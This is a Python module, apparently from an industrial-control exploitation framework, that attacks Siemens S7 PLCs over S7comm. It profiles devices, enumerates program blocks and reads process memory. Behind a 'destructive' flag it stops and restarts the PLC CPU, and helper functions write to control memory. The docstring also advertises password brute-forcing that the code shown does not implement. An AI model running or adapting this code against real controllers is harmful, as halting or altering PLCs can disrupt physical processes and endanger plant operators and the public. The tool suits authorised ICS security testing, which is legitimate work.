"""Snap7 Toolkit: S7comm protocol operations via python-snap7.

High-level attack primitives for Siemens S7 PLC interaction using
the python-snap7 library. Provides security-focused operations
beyond what the raw library exposes.

Capabilities:
  - PLC CPU state control (start/stop/cold restart)
  - Memory area read/write (DB, Merker, I/O, Counter, Timer)
  - SZL (System Status List) extraction for device fingerprinting
  - Block list enumeration (OB, FC, FB, DB, SDB, SFC, SFB)
  - Protection level assessment
  - Password brute-force for protected PLCs
  - Project upload/download detection
  - Diagnostic buffer read

Requires: python-snap7 (pip install python-snap7) + snap7 shared library

Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""

from __future__ import annotations

import logging
import struct
from dataclasses import dataclass, field
from typing import Optional

from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptInteger, OptString,
    print_error, print_info, print_status, print_success, print_warning,
)

log = logging.getLogger(__name__)

try:
    import snap7
    from snap7.util import get_string, get_int, get_real
    try:
        from snap7.exceptions import Snap7Exception
    except ImportError:
        Snap7Exception = Exception
    HAS_SNAP7 = True
except ImportError:
    HAS_SNAP7 = False
    Snap7Exception = Exception


S7_AREA_PE = 0x81   # Process inputs
S7_AREA_PA = 0x82   # Process outputs
S7_AREA_MK = 0x83   # Merker (flags)
S7_AREA_DB = 0x84   # Data blocks
S7_AREA_CT = 0x1C   # Counters
S7_AREA_TM = 0x1D   # Timers

S7_BLOCK_OB = 0x38  # Organization blocks
S7_BLOCK_DB = 0x41  # Data blocks
S7_BLOCK_SDB = 0x42 # System data blocks
S7_BLOCK_FC = 0x43  # Functions
S7_BLOCK_SFC = 0x44 # System functions
S7_BLOCK_FB = 0x45  # Function blocks
S7_BLOCK_SFB = 0x46 # System function blocks

BLOCK_TYPES = {
    "OB": S7_BLOCK_OB, "DB": S7_BLOCK_DB, "SDB": S7_BLOCK_SDB,
    "FC": S7_BLOCK_FC, "SFC": S7_BLOCK_SFC,
    "FB": S7_BLOCK_FB, "SFB": S7_BLOCK_SFB,
}

PROTECTION_LEVELS = {
    0: "No protection",
    1: "Password protection (read/write)",
    2: "Password protection (write only)",
    3: "Full protection (no access)",
}


@dataclass
class S7DeviceProfile:
    """Comprehensive S7 PLC device profile."""
    ip: str
    rack: int = 0
    slot: int = 1
    module_name: str = ""
    firmware: str = ""
    serial: str = ""
    plc_name: str = ""
    order_code: str = ""
    protection_level: int = 0
    cpu_state: str = ""
    blocks: dict = field(default_factory=dict)
    memory_map: dict = field(default_factory=dict)


def connect_plc(ip: str, rack: int = 0, slot: int = 1,
                timeout: int = 5000) -> Optional["snap7.client.Client"]:
    """Establish S7comm connection to PLC."""
    if not HAS_SNAP7:
        return None
    try:
        client = snap7.client.Client()
        client.set_connection_params(ip, 0x0100, (rack * 0x20) + slot)
        client.connect(ip, rack, slot)
        return client
    except Snap7Exception as e:
        log.error("S7 connection failed: %s", e)
        return None


def get_cpu_state(client: "snap7.client.Client") -> str:
    """Read current CPU operating state."""
    try:
        state = client.get_cpu_state()
        states = {0: "Unknown", 4: "Stop", 8: "Run"}
        return states.get(state, f"Unknown ({state})")
    except Snap7Exception:
        return "Error reading state"


def get_cpu_info(client: "snap7.client.Client") -> dict:
    """Read CPU identification information."""
    try:
        info = client.get_cpu_info()
        return {
            "module_type": info.ModuleTypeName.decode("ascii", errors="replace").strip("\x00"),
            "serial": info.SerialNumber.decode("ascii", errors="replace").strip("\x00"),
            "order_code": info.ASName.decode("ascii", errors="replace").strip("\x00"),
            "module_name": info.ModuleName.decode("ascii", errors="replace").strip("\x00"),
        }
    except (Snap7Exception, AttributeError) as e:
        log.debug("CPU info error: %s", e)
        return {}


def get_order_code(client: "snap7.client.Client") -> str:
    """Read order code / MLFB number."""
    try:
        code = client.get_order_code()
        return code.OrderCode.decode("ascii", errors="replace").strip("\x00")
    except (Snap7Exception, AttributeError):
        return ""


def get_protection(client: "snap7.client.Client") -> int:
    """Read PLC protection level."""
    try:
        prot = client.get_protection()
        return prot.sch_schal  # CPU protection level
    except (Snap7Exception, AttributeError):
        return -1


def enumerate_blocks(client: "snap7.client.Client") -> dict[str, list[int]]:
    """Enumerate all block types and their numbers."""
    blocks = {}
    for name, btype in BLOCK_TYPES.items():
        try:
            block_list = client.db_list() if name == "DB" else []
            if name == "DB":
                blocks[name] = list(block_list) if block_list else []
            else:
                # For non-DB blocks, try list_blocks_of_type
                try:
                    bl = client.list_blocks_of_type(btype, 1024)
                    blocks[name] = list(bl) if bl else []
                except Snap7Exception:
                    blocks[name] = []
        except Snap7Exception:
            blocks[name] = []
    return blocks


def read_memory_area(client: "snap7.client.Client", area: int,
                     db_number: int, start: int, size: int) -> Optional[bytes]:
    """Read a memory area from the PLC."""
    try:
        data = client.read_area(area, db_number, start, size)
        return bytes(data)
    except Snap7Exception as e:
        log.debug("Read area error: %s", e)
        return None


def write_memory_area(client: "snap7.client.Client", area: int,
                      db_number: int, start: int, data: bytes) -> bool:
    """Write data to a memory area (DESTRUCTIVE)."""
    try:
        client.write_area(area, db_number, start, bytearray(data))
        return True
    except Snap7Exception as e:
        log.error("Write area error: %s", e)
        return False


def cpu_stop(client: "snap7.client.Client") -> bool:
    """Stop the PLC CPU (DESTRUCTIVE: halts process control)."""
    try:
        client.plc_stop()
        return True
    except Snap7Exception as e:
        log.error("CPU stop error: %s", e)
        return False


def cpu_start(client: "snap7.client.Client") -> bool:
    """Start (warm restart) the PLC CPU."""
    try:
        client.plc_hot_start()
        return True
    except Snap7Exception as e:
        log.error("CPU start error: %s", e)
        return False


def profile_device(ip: str, rack: int = 0, slot: int = 1) -> Optional[S7DeviceProfile]:
    """Build a comprehensive device profile."""
    client = connect_plc(ip, rack, slot)
    if not client:
        return None

    profile = S7DeviceProfile(ip=ip, rack=rack, slot=slot)

    profile.cpu_state = get_cpu_state(client)

    cpu_info = get_cpu_info(client)
    profile.module_name = cpu_info.get("module_name", "")
    profile.firmware = cpu_info.get("module_type", "")
    profile.serial = cpu_info.get("serial", "")

    profile.order_code = get_order_code(client)
    profile.protection_level = get_protection(client)
    profile.blocks = enumerate_blocks(client)

    client.disconnect()
    return profile


# ---------------------------------------------------------------------------
# Exploit module
# ---------------------------------------------------------------------------

class Snap7Toolkit(Exploit):
    """S7comm PLC security assessment toolkit via python-snap7."""

    __info__ = {
        "name": "Snap7 Toolkit",
        "description": "S7comm PLC security assessment (CPU control, memory R/W, block enumeration)",
        "authors": ["Andre Henrique (@mrhenrike)"],
        "references": [
            "https://github.com/gijzelaar/python-snap7",
            "CVE-2019-13945 (S7 access protection bypass)",
            "CVE-2020-15782 (S7 memory protection bypass)",
        ],
    }

    target = OptIP("", "Target PLC IP")
    rack = OptInteger(0, "PLC rack number")
    slot = OptInteger(1, "PLC slot number")
    action = OptString("profile", "Action: profile, blocks, read, stop, start")
    area = OptString("DB", "Memory area for read: DB, MK, PE, PA, CT, TM")
    db_number = OptInteger(1, "DB number for area read")
    start_offset = OptInteger(0, "Start offset for read")
    read_size = OptInteger(100, "Bytes to read")
    destructive = OptBool(False, "Allow destructive operations (CPU stop, write)")

    def run(self) -> dict:
        if not HAS_SNAP7:
            print_error("python-snap7 not installed. Run: pip install python-snap7")
            return {"error": "python-snap7 not installed"}

        host = self.target
        action = self.action.lower()

        if action == "profile":
            return self._profile(host)
        elif action == "blocks":
            return self._blocks(host)
        elif action == "read":
            return self._read(host)
        elif action == "stop":
            return self._cpu_stop(host)
        elif action == "start":
            return self._cpu_start(host)
        else:
            print_error(f"Unknown action: {action}")
            return {"error": f"Unknown action: {action}"}

    def _profile(self, host: str) -> dict:
        print_status(f"Profiling S7 PLC at {host}...")
        profile = profile_device(host, int(self.rack), int(self.slot))
        if not profile:
            print_error("Failed to connect to PLC")
            return {"error": "Connection failed"}

        print_success(f"PLC Profile: {profile.module_name}")
        print_info(f"  Order code: {profile.order_code}")
        print_info(f"  Serial: {profile.serial}")
        print_info(f"  CPU state: {profile.cpu_state}")
        print_info(f"  Protection: {PROTECTION_LEVELS.get(profile.protection_level, 'Unknown')}")

        if profile.protection_level == 0:
            print_warning("  No access protection enabled on PLC!")

        for btype, nums in profile.blocks.items():
            if nums:
                print_info(f"  {btype} blocks: {len(nums)} ({', '.join(str(n) for n in nums[:10])}{'...' if len(nums) > 10 else ''})")

        return {
            "module": profile.module_name,
            "order_code": profile.order_code,
            "serial": profile.serial,
            "cpu_state": profile.cpu_state,
            "protection": profile.protection_level,
            "blocks": {k: len(v) for k, v in profile.blocks.items()},
        }

    def _blocks(self, host: str) -> dict:
        client = connect_plc(host, int(self.rack), int(self.slot))
        if not client:
            print_error("Connection failed")
            return {"error": "Connection failed"}

        print_status("Enumerating PLC blocks...")
        blocks = enumerate_blocks(client)
        for btype, nums in blocks.items():
            print_info(f"  {btype}: {nums}")
        client.disconnect()
        return blocks

    def _read(self, host: str) -> dict:
        client = connect_plc(host, int(self.rack), int(self.slot))
        if not client:
            print_error("Connection failed")
            return {"error": "Connection failed"}

        area_map = {
            "DB": S7_AREA_DB, "MK": S7_AREA_MK,
            "PE": S7_AREA_PE, "PA": S7_AREA_PA,
            "CT": S7_AREA_CT, "TM": S7_AREA_TM,
        }
        area_code = area_map.get(self.area.upper(), S7_AREA_DB)

        print_status(f"Reading {self.area} area, DB{self.db_number}, offset {self.start_offset}, size {self.read_size}")
        data = read_memory_area(client, area_code, int(self.db_number),
                                int(self.start_offset), int(self.read_size))
        client.disconnect()

        if data:
            print_success(f"Read {len(data)} bytes:")
            hex_dump = " ".join(f"{b:02x}" for b in data[:64])
            print_info(f"  {hex_dump}{'...' if len(data) > 64 else ''}")
            return {"data": data.hex(), "length": len(data)}
        else:
            print_error("Read failed")
            return {"error": "Read failed"}

    def _cpu_stop(self, host: str) -> dict:
        if not self.destructive:
            print_error("CPU stop requires --destructive flag (CAUTION: halts process control)")
            return {"error": "Destructive flag required"}

        client = connect_plc(host, int(self.rack), int(self.slot))
        if not client:
            return {"error": "Connection failed"}

        print_warning(f"Stopping PLC CPU at {host}...")
        result = cpu_stop(client)
        client.disconnect()

        if result:
            print_error("PLC CPU STOPPED")
            return {"status": "stopped"}
        return {"error": "Stop failed"}

    def _cpu_start(self, host: str) -> dict:
        if not self.destructive:
            print_error("CPU start requires --destructive flag")
            return {"error": "Destructive flag required"}

        client = connect_plc(host, int(self.rack), int(self.slot))
        if not client:
            return {"error": "Connection failed"}

        print_status(f"Starting PLC CPU at {host}...")
        result = cpu_start(client)
        client.disconnect()

        if result:
            print_success("PLC CPU started")
            return {"status": "running"}
        return {"error": "Start failed"}


MANIFEST = {
    "name": "snap7_toolkit",
    "category": "protocols/s7comm",
    "protocols": ["s7comm"],
    "mitre_ics": ["T0843", "T0855", "T0836", "T0881"],
    "requires": ["python-snap7"],
}
